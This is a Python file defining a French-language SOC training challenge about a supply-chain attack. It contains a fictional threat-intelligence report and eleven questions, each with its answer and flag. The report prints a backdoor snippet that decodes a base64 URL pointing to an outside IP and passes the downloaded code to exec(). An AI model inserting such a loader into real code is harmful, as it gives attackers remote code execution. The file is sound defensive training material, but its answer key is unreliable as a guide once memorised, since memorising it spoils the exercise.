"""
Challenge 12 — Attaque Supply Chain (Bonus Expert)
Niveau : 4 (Expert SOC)
Catégorie : Threat Intelligence
"""

ARTIFACT_SUPPLY_CHAIN = r"""
=== RAPPORT THREAT INTELLIGENCE — ANALYSE POST-INCIDENT ===
=== Classification : CONFIDENTIEL — Distribution restreinte ===
=== Date: 19/02/2026 ===

[SECTION 1 — ATTRIBUTION PRÉLIMINAIRE]

Le CERT-FR et nos partenaires TI ont fourni les renseignements suivants :

Groupe suspecté : "PHANTOM CRANE" (aussi connu: UNC-4892, TA-577b)
Origine probable : Europe de l'Est
Motivation : Financière (Ransomware-as-a-Service)
Actif depuis : 2024

TTPs connus de PHANTOM CRANE :
- Phishing ciblé avec macros Office (technique signature)
- Utilisation de DNS tunneling pour C2 (domaines .xyz)
- Déploiement d'implants custom avec 0 détection VT
- Exfiltration avant chiffrement (double extortion)
- Délai moyen Initial Access → Impact : 5-10 jours
- Ransomware: "Ph0nLock" (extensions .ph0n, .locked, .crane)
- Contact via ProtonMail (pattern: *-support@protonmail.com)

Infrastructure connue :
- ASN AS48693 (FlyHosting LLC, Russie) — hébergement C2
- Registrar NameCheap — enregistrement de domaines jetables
- DNS autoritaires sur serveurs russes (shady-hosting.ru)

[SECTION 2 — VECTEUR SUPPLY CHAIN DÉCOUVERT]

Investigation complémentaire — 19/02/2026 09:00 UTC

En analysant l'infrastructure de l'attaquant, l'équipe TI a découvert un second
vecteur d'attaque qui n'a PAS encore été exploité chez RedPawn mais qui a été
utilisé contre d'autres cibles :

Dépôt compromis : https://github.com/redpawn-corp/monitoring-agent
Commit suspect : b7a3f2c1 (daté du 14/02/2026, 03:15 UTC)
Auteur du commit : "deploy-bot" (compte compromis, pas un vrai bot)
Fichier modifié : src/telemetry/collector.py

Diff du commit malveillant :
```python
# Ajout suspect dans collector.py — ligne 234
import base64, urllib.request

def _update_check():
    # Check for telemetry updates (added by deploy-bot)
    try:
        u = base64.b64decode(b'aHR0cDovLzE4NS4yMzQuNzIuMTk6ODA4MC91cGRhdGUucHk=').decode()
        exec(urllib.request.urlopen(u).read())
    except:
        pass

# Appelé silencieusement dans la boucle principale
# threading.Timer(3600, _update_check).start()
```

Impact potentiel :
- Le package monitoring-agent est déployé sur TOUS les serveurs RedPawn
- La backdoor se déclencherait 1h après le démarrage du service
- L'URL décodée pointe vers: http://185.234.72.19:8080/update.py
- Le commit a été pushé pendant l'attaque principale (diversion?)

[SECTION 3 — CORRÉLATION AVEC D'AUTRES VICTIMES]

Notre ISP TI a identifié 3 autres victimes de PHANTOM CRANE :

Victime #1 : Société d'avocats (France) — Janvier 2026
  Vecteur: Phishing similaire (facture piégée .xlsm)
  Rançon: 8 BTC demandés, 3 BTC payés
  Délai: 8 jours (initial access → ransomware)
  
Victime #2 : Clinique médicale (Belgique) — Décembre 2025
  Vecteur: Compromission de prestataire IT (supply chain)
  Rançon: 12 BTC demandés, non payé (restauration backup)
  Délai: 12 jours
  
Victime #3 : PME industrielle (Suisse) — Novembre 2025
  Vecteur: Exploitation VPN Fortinet (CVE-2024-21762)
  Rançon: 3 BTC demandés, 3 BTC payés
  Délai: 5 jours
  Note: Double extortion — données publiées malgré paiement

[SECTION 4 — RECOMMANDATIONS CERT]

Actions immédiates requises :
1. Révoquer TOUS les credentials compromis (voir liste IoC)
2. Réinitialiser le mot de passe KRBTGT (2 fois, à 12h d'intervalle)
3. Auditer le dépôt GitHub monitoring-agent
4. Bloquer toutes les IP/domaines IoC au niveau firewall
5. Déployer les règles YARA fournies sur tous les endpoints
6. Activer le MFA sur tous les comptes à privilèges
7. Isoler et réimager toutes les machines compromises
"""

CHALLENGE = {
    "id": "c12_supply_chain",
    "title": "🔗 La Chaîne Brisée",
    "category": "threat_intel",
    "level": 4,
    "points_total": 450,
    "estimated_time": "35-50 min",
    "story": """
## 📋 Briefing de Mission

**Date :** 19 février 2026, 10h00  
**Priorité :** CRITIQUE  
**Source :** CERT-FR + Équipe Threat Intelligence

---

Au lendemain de l'incident, l'équipe Threat Intelligence partage son rapport d'attribution et une découverte alarmante : un second vecteur d'attaque de type **supply chain** a été identifié dans un dépôt GitHub interne.

> *"Le TI a identifié le groupe d'attaque et trouvé une backdoor dans notre dépôt monitoring-agent sur GitHub. C'est du supply chain. On pense qu'ils l'ont planqué pendant l'attaque comme plan B. Analyse le rapport, évalue le risque, et dis-moi si on est encore exposé."*

C'est le challenge final. Démontrez votre capacité à travailler sur du renseignement de menace et à évaluer un risque supply chain.
    """,
    "artifacts": [
        {
            "name": "threat_intel_report.txt",
            "type": "intelligence_report",
            "content": ARTIFACT_SUPPLY_CHAIN,
            "description": "Rapport Threat Intelligence — Attribution et découverte supply chain"
        }
    ],
    "questions": [
        {
            "id": "q1",
            "text": "Quel est le nom du groupe d'attaque identifié par l'équipe TI ?",
            "answer": "PHANTOM CRANE",
            "flag": "FLAG{PHANTOM_CRANE}",
            "points": 30,
            "hints": [
                "C'est dans la Section 1 — Attribution",
                "Aussi connu sous d'autres identifiants (UNC-...)"
            ],
            "hint_cost": 10
        },
        {
            "id": "q2",
            "text": "Quel est le nom du ransomware utilisé par ce groupe ?",
            "answer": "Ph0nLock",
            "flag": "FLAG{Ph0nLock}",
            "points": 40,
            "hints": [
                "Regardez les TTPs connus dans la Section 1",
                "Le nom est cohérent avec l'extension .ph0n"
            ],
            "hint_cost": 13
        },
        {
            "id": "q3",
            "text": "Quel fichier Python a été modifié comme backdoor supply chain ?",
            "answer": "collector.py",
            "flag": "FLAG{collector.py}",
            "points": 40,
            "hints": [
                "Regardez la Section 2 — Vecteur Supply Chain",
                "C'est dans src/telemetry/"
            ],
            "hint_cost": 13
        },
        {
            "id": "q4",
            "text": "Quel est le hash du commit malveillant sur GitHub ?",
            "answer": "b7a3f2c1",
            "flag": "FLAG{b7a3f2c1}",
            "points": 30,
            "hints": [
                "Cherchez 'Commit suspect' dans la Section 2"
            ],
            "hint_cost": 10
        },
        {
            "id": "q5",
            "text": "Après combien de temps (en secondes) la backdoor supply chain se déclencherait-elle ?",
            "answer": "3600",
            "flag": "FLAG{3600}",
            "points": 40,
            "hints": [
                "Regardez le threading.Timer dans le code Python",
                "3600 secondes = 1 heure"
            ],
            "hint_cost": 13
        },
        {
            "id": "q6",
            "text": "Combien d'autres victimes de PHANTOM CRANE ont été identifiées ?",
            "answer": "3",
            "flag": "FLAG{3}",
            "points": 30,
            "hints": [
                "Comptez les victimes dans la Section 3"
            ],
            "hint_cost": 10
        },
        {
            "id": "q7",
            "text": "Une victime a payé la rançon mais ses données ont quand même été publiées. Dans quel pays était-elle ?",
            "answer": "Suisse",
            "flag": "FLAG{Suisse}",
            "points": 50,
            "hints": [
                "Cherchez 'double extortion' et 'données publiées malgré paiement'",
                "C'est la PME industrielle"
            ],
            "hint_cost": 17
        },
        {
            "id": "q8",
            "text": "Combien de fois faut-il réinitialiser le mot de passe KRBTGT selon les recommandations ?",
            "answer": "2",
            "flag": "FLAG{2}",
            "points": 40,
            "hints": [
                "Regardez les recommandations CERT Section 4",
                "Il faut réinitialiser 2 fois à 12h d'intervalle pour invalider tous les tickets"
            ],
            "hint_cost": 13
        },
        {
            "id": "q9",
            "text": "Quelle vulnérabilité VPN a été exploitée chez la victime suisse ? (format: CVE-XXXX-XXXXX)",
            "answer": "CVE-2024-21762",
            "flag": "FLAG{CVE-2024-21762}",
            "points": 50,
            "hints": [
                "Regardez la Victime #3 dans la Section 3",
                "C'est une CVE Fortinet"
            ],
            "hint_cost": 17
        },
        {
            "id": "q10",
            "text": "Quel nom de compte GitHub compromis a été utilisé pour pousser la backdoor ?",
            "answer": "deploy-bot",
            "flag": "FLAG{deploy-bot}",
            "points": 40,
            "hints": [
                "Cherchez l'auteur du commit malveillant dans la Section 2",
                "C'est un faux compte bot"
            ],
            "hint_cost": 13
        },
        {
            "id": "q11",
            "text": "Quelle fonction Python dangereuse est utilisée dans la backdoor pour exécuter du code distant ?",
            "answer": "exec",
            "flag": "FLAG{exec}",
            "points": 40,
            "hints": [
                "Regardez le code Python de la backdoor",
                "C'est une fonction builtin Python qui exécute du code arbitraire"
            ],
            "hint_cost": 13
        }
    ]
}
